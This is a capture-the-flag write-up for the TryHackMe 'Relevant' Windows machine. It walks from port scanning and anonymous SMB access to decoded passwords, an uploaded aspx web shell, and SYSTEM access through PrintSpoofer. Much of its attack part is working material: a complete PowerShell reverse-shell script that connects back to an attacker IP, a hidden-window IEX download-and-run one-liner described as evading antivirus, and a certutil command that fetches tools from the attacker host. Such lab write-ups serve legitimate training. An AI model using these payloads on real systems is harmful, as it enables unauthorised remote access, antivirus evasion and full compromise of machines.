# TryHackMe Machine Relevent

**IP Address**
```shell
export ip=10.10.111.67
```

## Scanning

```
PORT      STATE SERVICE
80/tcp    open  http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-08-18T15:08:49+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-17T14:37:56
| Not valid after:  2023-02-16T14:37:56
| MD5:   8705 7420 7bf9 8563 bb66 29f5 cdde fd1d
|_SHA-1: 2c85 81dc 2811 d9b2 0d70 9cf7 593b 6b12 b260 53cc
|_ssl-date: 2022-08-18T15:08:48+00:00; -2m42s from scanner time.
49663/tcp open  http
49667/tcp open  unknown

Host script results:
|_clock-skew: mean: 1h21m18s, deviation: 3h07m50s, median: -2m42s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-18T08:08:49-07:00
| smb2-time: 
|   date: 2022-08-18T15:08:48
|_  start_date: 2022-08-18T14:38:15
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## Enumeration

```
smbclient -L \\\\$ip\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
```
The `nt4wrksv` share have anonymous login. We can connect to it using the following.
```shell
smbclient \\\\$ip\\nt4wrksv
```
In the share there is a `passwords.txt` file that have the following content.
```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
It looks like password encoded with `base64` after decoding it got the following results.
```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
I tried above password on RDP but It doesn't work.

**HTTP**
There are more then one http server running on the machine.

***Content-Discovery***
I run `ffuf` but doesn't found any usefull directory where we can use the above credentials or do any other things.
I try `nt4wrksv` share name on the web server and luckily it show status 200. That means that directory exits and when I request for `passwords.txt` it show me its content. I try uploading files from `smb` and I was successfully able to do that. Now we can upload any reverse shell code and execute it by visiting the page. As its a windows IIS server that use `aspx` or `asp` files as its backend language so we have to make our reverse shell using that. We can make reverse shell using `msfvenom` but I copy `/usr/share/webshells/aspx/cmdasp.aspx` on my current directory and upload it using the following command.
```smb
smb: \> put cmdasp.aspx
```
After that I visit the page on this link `http://$ip/nt4wrks/cmdasp.aspx` and they show me command execution box i can submit any command on there and they show me its output. I know i can directly get the reverse shell instead of this but its also a other possiblity to execute commands. Now I try to get a reverse shell by uploading reverse shell binary(.exe) but AntiVirus Delete all of them and also I cannot able to execute powershell reverse shell code from there because antivirus mark that malicious. So I search in google and got the following command that download a text file that contain powershell reverse shell code and after downloading that they execute it without alerting antivirus software. So I host the following powershell code 

```powershell
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
// Setup IPADDR
$address = '10.11.79.134'
// Setup PORT
$port = '4444'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
```
And save it with the name `powershell.reverse.txt` and host it using `python` http server.

Now I use this command on `cmdasp.aspx` endpoint and I got my reverse shell back without alerting the antivirus software.
```Reverse-Shell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://10.11.79.134/powershell.reverse.txt')"
```

## Priv-Escallation
Now I host `winpeas.bat` and transfer it using python http server i can also upload that using smb but i want a lengthy path.
```powershell
certutil.exe -urlcache -split -f http://10.11.79.134/winPEAS.bat winpeas.bat
```
After running `winpeas.bat` they show me our user have the following privilleges.

```cmd.exe
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
There we can see `SeImpersonatePrivilege` is enabled and we can abuse that using `PrintSpoofer` so I download printspoofer from this link https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
and send it to the target system and use the following command to get the system user.
```cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
```
This opens a command prompt with `nt authority\system` and we got the root/system.